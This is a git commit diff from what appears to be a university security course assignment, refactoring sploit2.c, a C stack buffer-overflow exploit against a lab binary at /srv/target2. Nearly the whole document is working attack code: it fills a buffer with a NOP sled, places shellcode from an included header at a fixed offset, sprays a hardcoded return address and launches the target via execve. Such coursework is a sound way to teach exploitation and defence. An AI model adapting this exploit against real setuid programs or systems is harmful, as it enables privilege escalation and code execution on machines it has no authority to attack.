f3e8589b90d81d454f8723032e33732cfaf719f9
justinhalford <justinhalford@gmail.com>
2024-05-10 18:20:00 -0400

    may 7

--- cs5435-hw4/sploits/sploit2.c
+++ cs5435-hw4/sploits/sploit2.c
@@ -6,43 +6,38 @@
 #include "shellcode.h"
 
 #define TARGET "/srv/target2"
+
 #define BUFFER_SIZE 409
+#define OFFSET 201
+#define RETURN_ADDRESS 0xffffdb5c
+
+void fill_buffer(char *buf) {
+    memset(buf, 0x90, BUFFER_SIZE - 1);
+    memcpy(buf + OFFSET, shellcode, sizeof(shellcode) - 1);
+    
+    for (int i = OFFSET + sizeof(shellcode) - 1; i < BUFFER_SIZE - 1; i += 4) {
+        *(uint32_t *)(buf + i) = RETURN_ADDRESS;
+    }
+    
+    buf[BUFFER_SIZE - 1] = '\0';
+}
 
 int main(void) {
     char *args[4];
     char *env[1];
-    char buf[BUFFER_SIZE]; // Buffer to store the payload
-
-    // Fill the buffer with NOPs
-    memset(buf, 0x90, sizeof(buf) - 1);
-
-    int offset = 201; // Offset where the shellcode is to be placed in the buffer
-
-    // Copy the shellcode into the buffer at the specified offset
-    memcpy(buf + offset, shellcode, sizeof(shellcode) - 1);
-
-    // Fill the remaining space after the shellcode with the return address
-    uint32_t return_address = 0xffffdb5c;
-    for (int i = offset + sizeof(shellcode) - 1; i < BUFFER_SIZE - 1; i += 4) {
-        *(uint32_t *)(buf + i) = return_address;
-    }
-
-    // Ensure the buffer is null-terminated
-    buf[BUFFER_SIZE - 1] = '\0';
-
-    // Setup arguments for executing the target program
+    char buf[BUFFER_SIZE];
+    
+    fill_buffer(buf);
+    
     args[0] = TARGET;
     args[1] = buf;
     args[2] = "65935";
     args[3] = NULL;
-
-    // Environment variable array terminated properly
+    
     env[0] = NULL;
-
-    // Execute the target binary with the crafted exploit
-    if (execve(TARGET, args, env) < 0) {
-        fprintf(stderr, "execve failed.\n");
-    }
-
+    
+    execve(TARGET, args, env);
+    fprintf(stderr, "execve failed.\n");
+    
     return 0;
 }
